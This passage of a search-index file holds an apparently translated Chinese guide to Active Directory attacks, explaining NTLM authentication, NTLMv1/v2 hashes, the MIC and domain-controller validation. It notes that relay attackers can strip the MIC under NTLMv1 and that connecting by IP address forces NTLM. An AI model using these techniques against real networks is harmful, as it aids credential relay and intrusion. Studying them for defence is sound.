<p>\u5b9e\u9645\u4e0a\uff0cWindows\u4f7f\u7528\u7684\u662fSPNG\uff0c\u5373SPNEGO\u7684\u6269\u5c55\u3002\u8fd9\u4e2a\u6269\u5c55\u5bf9SPNEGO\u8fdb\u884c\u4e86\u67d0\u4e9b\u6539\u8fdb\uff0c\u6bd4\u5982\u6dfb\u52a0\u4e86\u4e00\u4e2a\u540d\u4e3aNegTokenInit2\u7684\u65b0\u6d88\u606f\uff0c\u4f9b\u670d\u52a1\u5668\u521d\u59cb\u5316SPNEGO\u534f\u5546\u8fc7\u7a0b\u3002</p> <p></p> <p>SPNEGO\u534f\u5546</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm","title":"NTLM","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-basics","title":"NTLM Basics","text":"<p>NTLM\uff08NT LAN Manager\uff09\u662f\u4e00\u79cd\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0cWindows\u670d\u52a1\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u9a8c\u8bc1\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u3002NTLM\u662f\u5728NTLM SSP\u4e2d\u5b9e\u73b0\u7684\uff0c\u9664\u4e86\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u5916\uff0c\u5b83\u8fd8\u5141\u8bb8\u901a\u8fc7\u7b7e\u540d\u548c/\u6216\u52a0\u5bc6\u6d88\u606f\u6765\u4fdd\u62a4\u901a\u4fe1\u3002</p> <p>\u5728\u8ba8\u8bbaNTLM\u4e4b\u524d\uff0c\u6709\u4e00\u4e9b\u6982\u5ff5\u9700\u8981\u4e86\u89e3\uff0c\u4ee5\u9632\u5f04\u6df7\uff1a</p> <ul> <li>NTLM\uff1a\u7528\u4e8e\u5728\u8fdc\u7a0b\u673a\u5668\u4e2d\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u534f\u8bae\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3aNET-NTLM\u3002</li> <li>NTLMV1\uff1aNTLM\u7684\u7248\u672c1\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3aNET-NTLMV1\u3002</li> <li>NTLMV2\uff1aNTLM\u7684\u7248\u672c2\uff0c\u5b83\u4e0eNTLMv1\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u4f1a\u8bdd\u5bc6\u94a5\u548cNTLM\u54c8\u5e0c\u503c\u7684\u8ba1\u7b97\u65b9\u5f0f\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3aNET-NTLMV2\u3002</li> <li>NTLM2\uff1a\u662fNTLMv1\u7684\u5b89\u5168\u589e\u5f3a\u7248\uff0c\u4f46\u5b89\u5168\u6027\u4ecd\u5f31\u4e8eNTLMV2\u3002</li> <li>NTLM\u54c8\u5e0c\u503c/\u54cd\u5e94\uff1a\u670d\u52a1\u5668\u8d28\u8be2\u7684\u54cd\u5e94\uff0c\u901a\u8fc7NT\u54c8\u5e0c\u503c\u8ba1\u7b97\u5f97\u5230\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3aNet-NTLM\u54c8\u5e0c\u503c\u548cNTLM\u54cd\u5e94\u3002</li> <li>NTLMv1\u54c8\u5e0c\u503c\uff1a\u7531NTLMv1\u521b\u5efa\u7684NTLM\u54c8\u5e0c\u503c\u3002</li> <li>NTLMv2\u54c8\u5e0c\u503c\uff1a\u7531NTLMv2\u521b\u5efa\u7684NTLM\u54c8\u5e0c\u503c\u3002</li> <li>NT\u54c8\u5e0c\u503c\uff1a\u4ece\u7528\u6237\u5bc6\u7801\u6d3e\u751f\u7684\u54c8\u5e0c\u503c\uff0c\u7528\u4f5cNTLM\u8eab\u4efd\u9a8c\u8bc1\u7684\u673a\u5bc6\u3002\u5b83\u901a\u5e38\u88ab\u79f0\u4e3aNTLM\u54c8\u5e0c\u503c\uff0c\u4f46\u8fd9\u4e2a\u540d\u79f0\u662f\u4e0d\u6b63\u786e\u7684\uff0c\u56e0\u4e3aNTLM\u54c8\u5e0c\u503c\u662f\u7531NTLM\u534f\u8bae\u751f\u6210\u7684\u3002</li> <li>LM\u54c8\u5e0c\u503c\uff1a\u4ece\u7528\u6237\u5bc6\u7801\u6d3e\u751f\u7684\u65e7\u7684LAN Manager\u54c8\u5e0c\u503c\u5df2\u7ecf\u8fc7\u65f6\uff0c\u73b0\u5df2\u5f88\u5c11\u4f7f\u7528\u3002\u56e0\u4e3a\u5b83\u5f88\u5bb9\u6613\u7834\u89e3\u3002</li> <li>LM\u54cd\u5e94\uff1a\u670d\u52a1\u5668\u8d28\u8be2\u7684LM\u54cd\u5e94\uff0c\u4f7f\u7528LM\u54c8\u5e0c\u503c\u8ba1\u7b97\u5f97\u5230\u3002\u5b83\u53ef\u4ee5\u4e0eNTLM\u54cd\u5e94\u7ed3\u5408\u4f7f\u7528\u3002\u8fd9\u4e2a\u54cd\u5e94\u5df2\u7ecf\u8fc7\u65f6\u4e86\u3002</li> <li>LMV1\uff1aLM\u54cd\u5e94\u7684\u7248\u672c1\u3002</li> <li>LMV2\uff1aLM\u54cd\u5e94\u7684\u7248\u672c2\u3002</li> </ul> <p>\u9996\u5148\u9700\u8981\u77e5\u9053\u7684\u662f\uff0cNTLM\u5e76\u4e0d\u662f\u4e00\u4e2a\u751f\u6210\u7f51\u7edc\u901a\u4fe1\u91cf\u7684\u5b64\u7acb\u534f\u8bae\uff0c\u800c\u662f\u5fc5\u987b\u5d4c\u5165\u5230\u4e00\u4e2a\u5e94\u7528\u534f\u8bae\u4e2d\u4f7f\u7528\uff0c\u5982SMB\u3001LDAP\u6216HTTP\u534f\u8bae\u3002</p> <p>\u6b64\u5916\uff0cNTLM\u8fd8\u53ef\u4ee5\u5728Active Directory\u548c\u5de5\u4f5c\u7ec4\u7f51\u7edc\u4e2d\u4f7f\u7528\u3002\u5728Active Directory\u4e2d\uff0c\u5bf9\u4e8e\u57df\u7528\u6237\uff0c\u9996\u9009\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u662fKerberos\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528NTLM\uff0c\u800c\u8ba1\u7b97\u673a\u672c\u5730\u7528\u6237\u53ea\u80fd\u4f7f\u7528NTLM\u8fdb\u884c\u8fdc\u7a0b\u8eab\u4efd\u9a8c\u8bc1\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u6709\u53ef\u80fd\u5728\u57df\u4e2d\u7981\u7528NTLM\uff0c\u5b83\u4ecd\u7136\u5b58\u5728\u4e8e\u5f53\u4eca\u5927\u591a\u6570\u7f51\u7edc\u4e2d\u3002</p> <p>NTLM\u8eab\u4efd\u9a8c\u8bc1\u7531NEGOTIATE\u3001CHALLENGE\u548cAUTHENTICATE\u4e09\u4e2a\u6d88\u606f/\u9636\u6bb5\u7ec4\u6210\u3002</p> <p><code>client               server   |                    |   |                    |   |     NEGOTIATE      |   | -----------------&gt; |   |                    |   |     CHALLENGE      |   | &lt;----------------- |   |                    |   |    AUTHENTICATE    |   | -----------------&gt; |   |                    |   |    application     |   |      messages      |   | -----------------&gt; |   | &lt;----------------- |   | -----------------&gt; |   |                    |</code></p> <p>NTLM\u8eab\u4efd\u9a8c\u8bc1</p> <ol> <li>\u9996\u5148\uff0c\u5ba2\u6237\u7aef\u5728\u542f\u52a8\u5b89\u5168\u4e0a\u4e0b\u6587\u540e\uff0c\u4f1a\u901a\u8fc7\u8c03\u7528NTLM SSP\u7684InitializeSecurityContext\uff0c\u5411\u670d\u52a1\u5668\u53d1\u9001\u534f\u5546\u6d88\u606f\u3002\u8be5\u6d88\u606f\u7528\u4e8e\u6307\u793a\u5b89\u5168\u9009\u9879\uff0c\u6bd4\u5982\u8981\u4f7f\u7528\u7684NTLM\u7248\u672c\u7b49\u3002</li> </ol> <p></p> <p>NTLM\u534f\u5546\u6d88\u606f</p> <ol> <li>\u670d\u52a1\u5668\u901a\u8fc7\u8c03\u7528NTLM SSP\u7684AcceptSecurityContext\u6765\u751f\u6210\u8d28\u8be2\uff0c\u5e76\u5728\u8d28\u8be2\u6d88\u606f\u4e2d\u5c06\u5176\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u4f1a\u786e\u8ba4\u534f\u5546\u7684\u9009\u9879\uff0c\u5e76\u53d1\u9001\u6709\u5173\u5176\u8ba1\u7b97\u673a\u540d\u3001\u7248\u672c\u548c\u57df\u540d\u7684\u4fe1\u606f\u3002</li> </ol> <p></p> <p>NTLM\u8d28\u8be2\u6d88\u606f</p> <ol> <li>\u5ba2\u6237\u7aef\u63a5\u6536\u8d28\u8be2\u5e76\u5c06\u5176\u4ea4\u7ed9InitializeSecurityContext\uff0c\u4ee5\u4fbf\u4f7f\u7528\u5ba2\u6237\u7aef\u5bc6\u94a5\uff08NT\u54c8\u5e0c\u503c\uff09\u8ba1\u7b97\u54cd\u5e94\u3002\u5982\u679c\u9700\u8981\uff0c\u5b83\u8fd8\u4f1a\u521b\u5efa\u4e00\u4e2a\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u5e76\u4f7f\u7528\u4eceNT\u54c8\u5e0c\u503c\u6d3e\u751f\u7684\u5bc6\u94a5\uff08\u79f0\u4e3a\u4f1a\u8bdd\u57fa\u5bc6\u94a5\uff09\u5bf9\u5176\u8fdb\u884c\u52a0\u5bc6\u3002\u4e4b\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u54cd\u5e94\u548c\u4f1a\u8bdd\u5bc6\u94a5\u53d1\u56de\u670d\u52a1\u5668\u3002\u540c\u65f6\uff0c\u8fd8\u53d1\u9001\u79f0\u4e3aav_pairs\u7684\u4e0d\u540c\u5c5e\u6027\uff0c\u4ee5\u63d0\u4f9b\u8ba1\u7b97\u673a\u540d\u3001\u7248\u672c\u3001\u57df\u540d\u548c\u534f\u5546\u6807\u5fd7\u7b49\u4fe1\u606f\u3002\u800c\u4e14\uff0c\u8be5\u6d88\u606f\u8fd8\u5305\u62ecMIC\uff08\u6d88\u606f\u5b8c\u6574\u6027\u4ee3\u7801\uff09\u4ee5\u9632\u6b62\u7be1\u6539\u3002</li> </ol> <p></p> <p>NTLM\u8eab\u4efd\u9a8c\u8bc1\u6d88\u606f</p> <ol> <li>\u6700\u540e\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u8d28\u8be2\u54cd\u5e94\u662f\u5426\u6b63\u786e(AcceptSecurityContext)\uff0c\u5e76\u8bbe\u7f6e\u5b89\u5168\u4f1a\u8bdd/\u4e0a\u4e0b\u6587\u3002\u4ee5\u4e0b\u6d88\u606f\u5c06\u4f7f\u7528\u4f1a\u8bdd\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6/\u7b7e\u540d\u3002</li> </ol> <p></p> <p>\u8ba4\u8bc1\u5b8c\u6210</p> <pre><code>                     `client               server                            |                    |  AcquireCredentialsHandle  |                    |            |               |                    |            v               |                    |  InitializeSecurityContext |                    |            |               |     NEGOTIATE      |            '-------------&gt; | -----------------&gt; | ----------.                            |     - flags        |           |                            |                    |           v                            |                    | AcceptSecurityContext                            |                    |           |                            |                    |       challenge                            |     CHALLENGE      |           |            .-------------- | &lt;----------------- | &lt;---------'            |               |   - flags          |        challenge           |   - challenge      |            |               |   - server info    |            v               |                    |  InitializeSecurityContext |                    |        |       |           |                    |     session  response      |                    |       key      |           |    AUTHENTICATE    |        '-------'---------&gt; | -----------------&gt; | ------.--------.                            |   - response       |       |        |                            |   - session key    |       |        |                            |     (encrypted)    |   response  session                            |   - attributes     |       |       key                            |     + client info  |       |        |                            |     + flags        |       v        v                            |   - MIC            | AcceptSecurityContext                            |                    |           |                            |                    |           v                            |                    |           OK                            |                    |`\n</code></pre> <p>NTLM \u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b</p> <p>NTLM\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u662f\u7531NTLM SSP\u5904\u7406\u7684\uff0c\u8868\u60c5\u72ec\u7acb\u4e8e\u4f7f\u7528\u5b83\u7684\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\u3002\u6b64\u5916\uff0c\u5fc5\u987b\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u8bc1\u660e\u5176\u8eab\u4efd\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u63d0\u4f9b\u5bc6\u94a5\u3002NTLM\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u4f7f\u7528\u7684\u5bc6\u94a5\u662f\u5145\u5f53\u5ba2\u6237\u7aef\u7684\u7528\u6237\u7684NT\u54c8\u5e0c\u503c\uff08\u5728NTLMv1\u4e2d\u4e5f\u4f7f\u7528LM\u54c8\u5e0c\u503c\uff09\u3002</p> <p>\u7136\u800c\uff0c\u5728NTLM\u4e2d\uff0cNT\u54c8\u5e0c\u503c\u4e0d\u4f1a\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\uff0c\u800c\u4ec5\u7528\u4e8e\u8ba1\u7b97\u5bf9\u670d\u52a1\u5668\u8d28\u8be2\u548c\u4f1a\u8bdd\u5bc6\u94a5\u7684NTLM\u54cd\u5e94\u3002NTLM\u54cd\u5e94\u4e5f\u79f0\u4e3aNTLM\u54c8\u5e0c\u503c\uff08\u4e5f\u79f0\u4e3aNet-NTLM\u54c8\u5e0c\u503c\uff09\u3002NTLM\u54c8\u5e0c\u503c\u7684\u8ba1\u7b97\u53d6\u51b3\u4e8eNTLM\u534f\u8bae\u7684\u5177\u4f53\u7248\u672c\u3002</p> <p>\u4f7f\u7528NTLM\u65f6\uff0c\u51ed\u636e\u4e0d\u4f1a\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\uff0c\u56e0\u6b64\u4e0d\u4f1a\u7f13\u5b58\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e2d\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7Mimikatz\u68c0\u7d22\u5b83\u4eec\u3002</p> <p>\u76ee\u524d\u6709\u4e24\u4e2a\u7248\u672c\u7684NTLM\u534f\u8bae\uff1aNTLMv1\u548cNTLMv2\u3002\u8981\u4f7f\u7528\u7684\u7248\u672c\u4e0d\u662f\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u534f\u5546\u51fa\u6765\u7684\uff0c\u6240\u4ee5\uff0c\u5fc5\u987b\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e2d\u8fdb\u884c\u6b63\u786e\u914d\u7f6e\u3002</p> <p>\u4f46\u662f\uff0c\u5728NTLM\u6d88\u606f\u4e2d\uff0c\u53ef\u4ee5\u534f\u5546\u5176\u4ed6\u5b89\u5168\u53c2\u6570\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u4f1a\u8bdd\u7b7e\u540d\u3002\u6709\u52a9\u4e8e\u9632\u5fa1NTLM\u4e2d\u7ee7\u653b\u51fb\u3002</li> <li>\u4f1a\u8bdd\u5bc6\u5c01\\\u52a0\u5bc6\u3002\u5e76\u4e0d\u5e38\u7528\u3002</li> <li>\u751f\u6210LM\u54cd\u5e94\u3002\u5728\u4e0d\u9700\u8981LM\u54cd\u5e94\u7684\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u5668\u4e0d\u4f1a\u5904\u7406\u8be5\u54cd\u5e94\u3002</li> <li>\u4f7f\u7528NTLMv2\u6216NTLMv1\u4f1a\u8bdd\u5b89\u5168\u6027\u3002\u4f1a\u8bdd\u5b89\u5168\u6027\u4e0d\u662f\u8eab\u4efd\u9a8c\u8bc1\u7248\u672c\uff0c\u800c\u662f\u63d0\u9ad8NTLMv1\u8eab\u4efd\u9a8c\u8bc1\u5b89\u5168\u6027\u7684\u6269\u5c55\u3002</li> </ul> <p>\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u8003\u5bdfNTLMv1\u548cNTLMV2\u4e4b\u95f4\u7684\u533a\u522b\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlmv1","title":"NTLMv1","text":"<p>\u5728NTLMv1\u4e2d\uff0c\u8d28\u8be2\u670d\u52a1\u5668\u7684NTLM\u54cd\u5e94(NTLMv1\u54c8\u5e0c\u503c\uff09\u662f\u901a\u8fc7\u4f7f\u7528NT\u54c8\u5e0c\u503c\u901a\u8fc7DES\u7b97\u6cd5\u6765\u52a0\u5bc6\u670d\u52a1\u5668\u8d28\u8be2\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u4f1a\u8bdd\u5bc6\u94a5\u4e5f\u662f\u76f4\u63a5\u7528NT\u54c8\u5e0c\u503c\u8fdb\u884c\u52a0\u5bc6\u7684\u3002</p> <pre><code>`NTLMv1\u53ef\u4ee5\u548cNTLMv2 Session Security\u4e00\u8d77\u4f7f\u7528\uff0c\u6ce8\u610f\uff0c\u540e\u8005\u5e76\u4e0d\u662fNTLMv2\uff0c\u800c\u662f\u589e\u5f3aNTLMv1\u5b89\u5168\u6027\u7684\u6269\u5c55\u7248\u672c\u3002`\n\n                `Server                  Client                    challenge               challenge                        |           (if NTLMv2 Session Security)                        |                       |                        '-----------.-----------'                                    |                                    v              .---&gt; LM hash --&gt; Password ----|                   NTLMv1              '---&gt; NT hash --&gt;                                             v                                    |                    .---------------|----------------.                    |               |                |                    v               v                v              NTv1 Response   LMv1 Response    Session Base Key              (NTLMv1 Hash)   (LMv1 Hash)`\n</code></pre> <p>NTLMv1\u8eab\u4efd\u9a8c\u8bc1</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlmv2","title":"NTLMv2","text":"<p>\u7136\u800c\uff0c\u5728NTLMv2\u4e2d\uff0c\u4e3a\u4e86\u4fdd\u62a4AUTHENTICATE\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u4ece\u800c\u4fdd\u62a4hole\u4f1a\u8bdd\u7684\u5b8c\u6574\u6027\uff0c\u9700\u8981\u5f15\u5165\u66f4\u591a\u7684\u6570\u636e\u3002\u4e3a\u4e86\u8ba1\u7b97\u54cd\u5e94\uff08NTLM\u54c8\u5e0c\u503c\uff09\uff0cNTLMv2\u5c06\u8003\u8651\u4e0b\u5217\u56e0\u7d20\uff1a</p> <ul> <li>\u670d\u52a1\u5668\u8d28\u8be2</li> <li>\u968f\u673a\u751f\u6210\u7684\u5ba2\u6237\u7aef\u8d28\u8be2</li> <li>\u5f53\u524d\u65f6\u95f4\u6233</li> <li>AvPairs\u5b57\u6bb5\uff0c\u5305\u542b\u670d\u52a1\u5668\u57df/\u4e3b\u673a\u540d\u7b49\u4fe1\u606f\uff0c\u6216\u8005\u6d88\u606f\u4e2d\u662f\u5426\u5305\u542bMic\uff08MsvAvFlags\uff09\u3002\uff08\u5728\u76f8\u5173\u6587\u6863\u4e2d\uff0cAvPairs\u88ab\u8bb0\u5f55\u4e3a\u4ee4\u4eba\u56f0\u60d1\u7684ServerName\u5b57\u6bb5\uff09<pre><code>                                                  `.---                                                           | - Domain            Server       Client      Timestamp    AvPairs &lt;  - Dns            challenge    challenge        |           |     | - IsMicPresent?               |            |            |           |     | - Etc...               |            |            |           |     '---               '------------'-----.------'-----------'                                                           |                                  v                                              Password ---&gt; NT hash ----&gt;  NTLMv2                                   |                                  |                  .---------------|----------------.                  |               |                |                  v               v                v            NTv2 Response   LMv2 Response    Session Base Key            (NTLMv2 Hash)   (LMv2 Hash)`\n</code></pre> </li> </ul> <p>NTLMv2\u8eab\u4efd\u9a8c\u8bc1</p> <p>NTLMv2\u5c06\u5c31\u6240\u6709\u8fd9\u4e9b\u6570\u636e\u8fde\u5728\u4e00\u8d77\uff0c\u5e76\u5e94\u7528HMAC\u6765\u8ba1\u7b97NTLM\u54cd\u5e94\uff0c\u79f0\u4e3aNTLMv2\u54c8\u5e0c\u503c\u3002\u6b64\u5916\uff0c\u8be5\u6570\u636e\u8fd8\u7528\u4e8e\u8ba1\u7b97\u4f1a\u8bdd\u5bc6\u94a5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#mic","title":"MIC","text":"<p>\u53e6\u5916\uff0c\u4e3a\u4e86\u4fdd\u62a4NTLM\u534f\u5546\u7684\u5b8c\u6574\u6027\uff0cAUTHENTICATE\u6d88\u606f\u8fd8\u5c06\u63d0\u4f9bMIC\u3002MIC\u662f\u901a\u8fc7\u4f7f\u7528\u4f1a\u8bdd\u5bc6\u94a5\u5bf9NTLM\u8fc7\u7a0b\u7684\u6240\u6709\u6d88\u606f\u5e94\u7528HMAC\u6765\u8ba1\u7b97\u5f97\u5230\u7684\u3002</p> <pre><code>       `NEGOTIATE        CHALLENGE        AUTHENTICATE                |                |                 |                '----------------'-----------------'                                 |                                 v   Exported Session Key ----&gt;  HMAC-MD5                                  |                                 v                                MIC`\n</code></pre> <p>MIC\u7684\u8ba1\u7b97\u8fc7\u7a0b</p> <p>\u56e0\u6b64\uff0c\u8fd93\u6761\u6d88\u606f\u7684\u5b8c\u6574\u6027\u90fd\u5f97\u5230\u4e86\u4fdd\u62a4\u3002\u800c\u4e14\uff0c\u5728\u653b\u51fb\u8005\u5220\u9664MIC\u7684\u60c5\u51b5\u4e0b\uff0c\u8eab\u4efd\u9a8c\u8bc1\u5c06\u5931\u8d25\uff0c\u56e0\u4e3aNTLMv2\u54cd\u5e94\u4e3aMIC\u7684\u5b58\u5728\u6807\u5fd7\u63d0\u4f9b\u4e86\u4fdd\u62a4\u3002\u7136\u800c\uff0c\u5728\u8fc7\u53bb\uff0cMIC\u4e00\u76f4\u662f\u5404\u79cd\u5b89\u5168\u5ba1\u67e5\u7684\u76ee\u6807\uff0c\u4eba\u4eec\u8fd8\u662f\u5728\u5176\u4e2d\u53d1\u73b0\u4e86Drop the MIC\u548cDrop the MIC2\u6f0f\u6d1e\u3002</p> <p>\u5fc5\u987b\u6ce8\u610f\u7684\u662f\uff0cNTLMv1\u5728\u521b\u5efa\u54cd\u5e94\u65f6\u6ca1\u6709\u8003\u8651NTLM\u6807\u5fd7\u3002\u56e0\u6b64\uff0c\u5728\u4f7f\u7528NTLMv1\u7684\u60c5\u51b5\u4e0b\uff0c\u6267\u884cNTLM\u4e2d\u7ee7\u653b\u51fb\u7684\u653b\u51fb\u8005\u53ea\u9700\u5220\u9664AUTHENTICATE\u6d88\u606f\u7684MIC\uff08\u5e76\u8c03\u6574Drop the MIC\u4e2d\u663e\u793a\u7684\u6807\u5fd7\uff09\u5373\u53ef\u7be1\u6539\u6570\u636e\uff0c\u4f8b\u5982\uff0c\u7981\u7528\u5e94\u7528\u7a0b\u5e8f\u6d88\u606f\u7684\u7b7e\u540d\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-in-active-directory","title":"NTLM in Active Directory","text":"<p>NTLM\u65e2\u53ef\u4ee5\u5728\u5de5\u4f5c\u7ec4\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728Active Directory\u4e2d\u4f7f\u7528\u3002\u5728\u540e\u4e00\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u5141\u8bb8\u5bf9\u7f51\u7edc\u673a\u5668\u4e2d\u7684\u57df\u5e10\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f46\u662f\uff0cNT\u54c8\u5e0c\u503c\u662f\u5b58\u50a8\u5728\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u4e2d\u7684Active Directory\u6570\u636e\u5e93\u4e2d\u7684\u3002</p> <p>\u56e0\u6b64\uff0c\u4e3a\u4e86\u9a8c\u8bc1\u57df\u5e10\u6237\u7684AUTHENTICATE\u6d88\u606f\uff0c\u76ee\u6807\u673a\u5668\u5c06\u5411DC\u53d1\u9001\u4e00\u4e2aNetlogon\uff08NetrLogonSamLogonWithFlags\uff09\u8bf7\u6c42\uff0c\u8981\u6c42\u5b83\u9a8c\u8bc1\u5ba2\u6237\u7aef\u5bf9\u8d28\u8be2\u7684\u54cd\u5e94\u3002\u4e4b\u540e\uff0cDC\u4f1a\u9a8c\u8bc1\u8fd9\u4e2a\u54cd\u5e94\uff0c\u5e76\u5411\u8ba1\u7b97\u673a\u8fd4\u56de\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u5982\u4f1a\u8bdd\u5bc6\u94a5\u548c\u7528\u6237\u7279\u6743\uff0c\u4ee5\u4fbf\u7ee7\u7eed\u5e94\u7528\u7a0b\u5e8f\u4f1a\u8bdd\u3002</p> <p><code>client            server                          DC     |                 |                              |     |                 |                              |     |    NEGOTIATE    |                              |     | --------------&gt; |                              |     |                 |                              |     |    CHALLENGE    |                              |     | &lt;-------------- |                              |     |                 |                              |     |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |     | --------------&gt; | ---------------------------&gt; |     |                 |                              |     |                 |        ValidationInfo        |     |                 | &lt;--------------------------- |     |                 |                              |     |   application   |                              |     |    messages     |                              |     | --------------&gt; |                              |     |                 |                              |     | &lt;-------------- |                              |     |                 |                              |     | --------------&gt; |                              |     |                 |                              |</code></p> <p>\u5177\u6709\u57df\u5e10\u6237\u65f6\u7684NTLM\u8fc7\u7a0b</p> <p>\u800c\u4e14\uff0cNTLM\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4e0d\u540c\u57df\u4e2d\u7684\u673a\u5668\u3002\u5982\u679c\u6240\u4f7f\u7528\u7684\u5e10\u6237\u90fd\u6765\u81ea\u4e0e\u670d\u52a1\u5668\u4e0d\u540c\u7684\u57df\uff0c\u5b83\u5fc5\u987b\u5411DC\u8bf7\u6c42\u9a8c\u8bc1AUTHENTICATE\u6d88\u606f\uff0c\u800cDC\u5219\u5fc5\u987b\u5c06AUTHENTICATE\u6d88\u606f\u53d1\u9001\u5230\u7528\u6237\u5e10\u6237\u57df\u7684DC\u4ee5\u8fdb\u884c\u9a8c\u8bc1\uff08\u901a\u8fc7\u4f7f\u7528\u4fe1\u4efb\u5173\u7cfb\uff09\u3002</p> <p><code>client            server                          DC                      DC  (it.foo.com)     (foo.com)                      (foo.com)         (it.foo.com)     |                 |                              |                       |     |                 |                              |                       |     |    NEGOTIATE    |                              |                       |     | --------------&gt; |                              |                       |     |                 |                              |                       |     |    CHALLENGE    |                              |                       |     | &lt;-------------- |                              |                       |     |                 |                              |                       |     |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |  NetrLogonSamLogonEx  |     | --------------&gt; | ---------------------------&gt; | --------------------&gt; |     |                 |                              |                       |     |                 |      ValidationInfo          |    ValidationInfo     |     |                 | &lt;--------------------------- | &lt;-------------------- |     |                 |                              |                       |     |   application   |                              |                       |     |    messages     |                              |                       |     | --------------&gt; |                              |                       |     |                 |                              |                       |     | &lt;-------------- |                              |                       |     |                 |                              |                       |     | --------------&gt; |                              |                       |     |                 |                              |                       |</code></p> <p>\u57df\u95f4NTLM\u8fc7\u7a0b</p> <p>\u8fd9\u6837\uff0c\u5373\u4f7f\u901a\u5e38\u4f7f\u7528\u7684\u662fKerberos\uff0c\u4e5f\u53ef\u4ee5\u5728Active Directory\u4e2d\u4f7f\u7528NTLM\uff0c\u56e0\u4e3a\u5b83\u662f\u8be5\u73af\u5883\u4e2d\u7684\u9ed8\u8ba4\u9009\u9879\u3002</p> <p>\u5f3a\u5236\u8fdb\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\u800c\u4e0d\u662fKerberos\uff08\u5728Windows\u5185\u7f6e\u5b9e\u7528\u7a0b\u5e8f\u4e2d\uff09\u7684\u4e00\u4e2a\u6280\u5de7\uff0c\u662f\u901a\u8fc7\u6307\u5b9aIP\u5730\u5740\u800c\u975e\u4e3b\u673a\u540d\u8fde\u63a5\u5230\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u56e0\u4e3aKerberos\u9700\u8981\u4e3b\u673a\u540d\u6765\u6807\u8bc6\u8ba1\u7b97\u673a\u670d\u52a1\u3002</p> <p>\u4f8b\u5982\uff0c\u547d\u4ee4dir\\dc01\\c$\u5c06\u4f7f\u7528Kerberos\u9488\u5bf9\u8fdc\u7a0b\u5171\u4eab\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800cdir\\192.168.100.2\\c$\u5219\u4f7f\u7528NTLM\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-attacks","title":"NTLM 